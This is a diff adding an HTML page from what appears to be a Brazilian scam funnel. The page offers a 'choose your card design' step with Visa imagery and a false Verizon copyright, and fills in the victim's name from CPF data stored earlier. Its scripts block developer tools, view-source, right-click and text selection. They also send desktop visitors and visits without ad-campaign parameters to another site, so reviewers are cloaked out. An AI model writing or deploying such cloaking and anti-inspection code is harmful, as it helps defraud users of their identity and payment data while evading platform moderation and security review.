@@ -1,0 +1,389 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"
+    url="https://appavaliadorpremios.shop/lp/"></script>
+
+<script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+        window.location.href = 'https://appavaliadorpremios.shop/lp/';
+    }
+</script>
+  <script type="text/javascript">
+    (function () {
+        /**
+         * Função para verificar a presença de múltiplos parâmetros na URL
+         * @param {Array} names - Array contendo os nomes dos parâmetros a serem verificados
+         * @returns {boolean} - Retorna true se todos os parâmetros estiverem presentes, caso contrário, false
+         */
+        function hasAllURLParameters(names) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return names.every(param => urlParams.has(param));
+        }
+
+        // Array contendo os parâmetros obrigatórios
+        const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
+
+        // URL para redirecionamento caso algum dos parâmetros não esteja presente
+        const redirectURL = 'https://appavaliadorpremios.shop/lp/';
+
+        /**
+         * Função principal que verifica os parâmetros da URL
+         * e redireciona o usuário se necessário
+         */
+        function checkURLParameters() {
+            if (!hasAllURLParameters(requiredParams)) {
+                window.location.href = redirectURL;
+            }
+        }
+
+        // Executa a verificação imediatamente assim que o script é carregado
+        checkURLParameters();
+    })();
+</script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, max-scale=1.0">
+   
+
+    <style>
+      .header {
+        background: linear-gradient(147deg, #ffe53b 0%, #ff2525 74%);
+        padding: 15px 0;
+        text-align: center;
+      }
+      .main-content {
+        max-width: 600px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 30px auto;
+      }
+      .color-options {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
+      .color-options button {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        border: 2px solid transparent;
+        cursor: pointer;
+        transition: border 0.3s ease;
+      }
+      .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+      }
+      .footer p {
+        margin: 0; /* Remove espaçamento extra entre as linhas do rodapé */
+      }
+      .color-options button:hover {
+        border-color: #6c63ff;
+      }
+      .color-options .selected {
+        border-color: #6c63ff;
+      }
+      .btn-custom {
+        background-color: #ff2525;
+        color: rgb(255, 255, 255);
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+      .btn-custom:hover {
+        background-color: #000;
+      }
+      .cartao-container {
+        position: relative;
+        display: inline-block;
+      }
+      .cartao {
+        width: var(--cartao-width, 350px);
+        height: var(--cartao-height, 200px);
+        border-radius: 15px;
+        background: var(--cartao-bg, #1e90ff);
+        color: white;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        font-family: Arial, sans-serif;
+        position: relative;
+        overflow: hidden;
+      }
+      .imagem-chip {
+        width: 35px;
+        position: absolute;
+        top: 40%;
+        left: 15px;
+        transform: translateY(-50%);
+      }
+      .imagem-lateral {
+        width: 30px;
+        position: absolute;
+        top: 40%;
+        left: 60px;
+        transform: translateY(-50%);
+      }
+      .top-left-text {
+        position: absolute;
+        top: 15px;
+        left: 15px;
+        width: 100px;
+      }
+      .top-right-img {
+        width: 50px;
+        position: absolute;
+        top: 15px;
+        right: 15px;
+      }
+      .card-details {
+        display: flex;
+        justify-content: space-between;
+        position: absolute;
+        bottom: 20px;
+        width: 90%;
+        left: 5%;
+      }
+      .titular {
+        text-align: left;
+      }
+      .valido {
+        text-align: right;
+      }
+      .titular p,
+      .valido p {
+        margin: 0;
+        font-size: 10px; /* Tamanho da fonte para o texto */
+      }
+      .texto {
+        font-size: 14px; /* Tamanho da fonte do texto "Titular do Cartão" */
+        text-transform: uppercase;
+        color: #ffffff;
+      }
+    </style>
+
+    <script>
+      if (document.addEventListener) {
+        document.addEventListener("keydown", bloquearSource);
+      } else {
+        //Versões antigas do IE
+        document.attachEvent("onkeydown", bloquearSource);
+      }
+
+      function bloquearSource(e) {
+        e = e || window.event;
+
+        var code = e.which || e.keyCode;
+
+        if (
+          e.ctrlKey &&
+          (code == 83 || code == 85) //83 = S, 85 = U
+        ) {
+          if (e.preventDefault) {
+            e.preventDefault();
+          } else {
+            e.returnValue = false;
+          }
+
+          return false;
+        }
+      }
+    </script>
+
+    <style>
+      /*desabilita a seleção no body*/
+      body {
+        -webkit-touch-callout: none; /* iOS Safari */
+        -webkit-user-select: none; /* Chrome/Safari/Opera */
+        -khtml-user-select: none; /* Konqueror */
+        -moz-user-select: none; /* Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+        user-select: none;
+      }
+
+      /*habilita a seleção nos campos editaveis*/
+      input,
+      textarea {
+        -webkit-touch-callout: initial; /* iOS Safari */
+        -webkit-user-select: text; /* Chrome/Safari/Opera */
+        -khtml-user-select: text; /* Konqueror */
+        -moz-user-select: text; /* Firefox */
+        -ms-user-select: text; /* Internet Explorer/Edge */
+        user-select: text;
+      }
+
+      /*habilita a seleção nos campos com o atributo contenteditable*/
+      [contenteditable="true"] {
+        -webkit-touch-callout: initial; /* iOS Safari */
+        -webkit-user-select: all; /* Chrome/Safari/Opera */
+        -khtml-user-select: all; /* Konqueror */
+        -moz-user-select: all; /* Firefox */
+        -ms-user-select: all; /* Internet Explorer/Edge */
+        user-select: all;
+      }
+    </style>
+
+    <script>
+      if (document.addEventListener) {
+        document.addEventListener("contextmenu", function (e) {
+          e.preventDefault();
+          return false;
+        });
+      } else {
+        //Versões antigas do IE
+        document.attachEvent("oncontextmenu", function (e) {
+          e = e || window.event;
+          e.returnValue = false;
+          return false;
+        });
+      }
+    </script>
+
+    <script async="" src="js.html"></script>
+
+   
+   <script type="text/javascript" async="" src="f.txt"></script>
+
+   <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-NGSPZL3X93"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NGSPZL3X93');
+</script>
+
+
+ </head>
+
+
+
+  <body>
+  
+   
+
+    <div style="
+        display: grid;
+        grid-template-areas:
+          'top-bar'
+          'content'
+          'footer';
+        grid-template-rows: auto 1fr auto;
+        min-height: 100vh;
+      ">
+      <div class="header">
+        <img decoding="async" style="width: 120px" src="images/logo.png" alt="Imagem Centralizada">
+      </div>
+      <div style="grid-area: content; padding: 0 1rem">
+        <div class="main-content">
+          <h4 style="font-size: 20px">Escolha o design do seu cartão</h4>
+          <!-- Defina o tamanho aqui -->
+          <p style="font-size: 16px">
+            Selecione o estilo que mais combina com você
+          </p>
+          <h6 style="font-size: 16px">Escolha a cor do seu cartão</h6>
+          <div class="color-options">
+            <button style="background-color: #000" class="selected"></button>
+            <button style="background-color: #8420b3"></button>
+            <button style="background-color: #ffc600"></button>
+            <button style="background-color: #0454cc"></button>
+          </div>
+          <div class="cartao-container">
+            <div class="cartao">
+              <img src="images/Visa-logo-white.png" alt="Top-right logo" class="top-right-img">
+              <img src="images/chip-1-logo-png-transparent.png" alt="Chip do Cartão" class="imagem-chip">
+              <img src="images/Design-sem-nome.png" alt="Lateral logo" class="imagem-lateral">
+              <div class="card-details">
+                <div class="titular">
+                  <p class="texto">Titular do Cartão</p>
+                  <p id="titular-nome" style="font-size: 16px">nivo front teste</p>
+                </div>
+                <div class="valido">
+                  <p class="texto">Válido Até</p>
+                  <p id="valido-data" style="font-size: 14px">01/32</p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <button class="btn-custom" onclick="location.href='drop.html' + window.location.search">
+            CONTINUAR
+          </button>
+        </div>
+      </div>
+      <!-- Footer -->
+      <div class="footer">
+        Copyright © 2025 Verizon. Todos os direitos reservados.<br>
+
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa
+        do Site
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const dadosUsuario = JSON.parse(localStorage.getItem("dadosCPF"));
+        if (dadosUsuario && dadosUsuario.nomeCompleto) {
+          document.getElementById("titular-nome").innerText =
+            dadosUsuario.nomeCompleto;
+        } else {
+          document.getElementById("titular-nome").innerText =
+            "Nome Indisponível";
+        }
+
+        const corSelecionada = localStorage.getItem("cartaoCor");
+        if (corSelecionada) {
+          document.querySelector(".cartao").style.backgroundColor =
+            corSelecionada;
+          document
+            .querySelector(`.color-options button[style*="${corSelecionada}"]`)
+            .classList.add("selected");
+        }
+      });
+
+      const colorOptions = document.querySelectorAll(".color-options button");
+      const cartao = document.querySelector(".cartao");
+
+      colorOptions.forEach((button, index) => {
+        button.addEventListener("click", () => {
+          document
+            .querySelector(".color-options .selected")
+            .classList.remove("selected");
+          button.classList.add("selected");
+
+          const colors = ["#000", "#8420b3", "#ffc600", "#0454cc"];
+          const selectedColor = colors[index];
+
+          cartao.style.background = selectedColor;
+          localStorage.setItem("cartaoCor", selectedColor);
+        });
+      });
+    </script>
+
+  <script>
+      window.pixelId = "66b3a64f335ef199b3e5b257";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body></html>
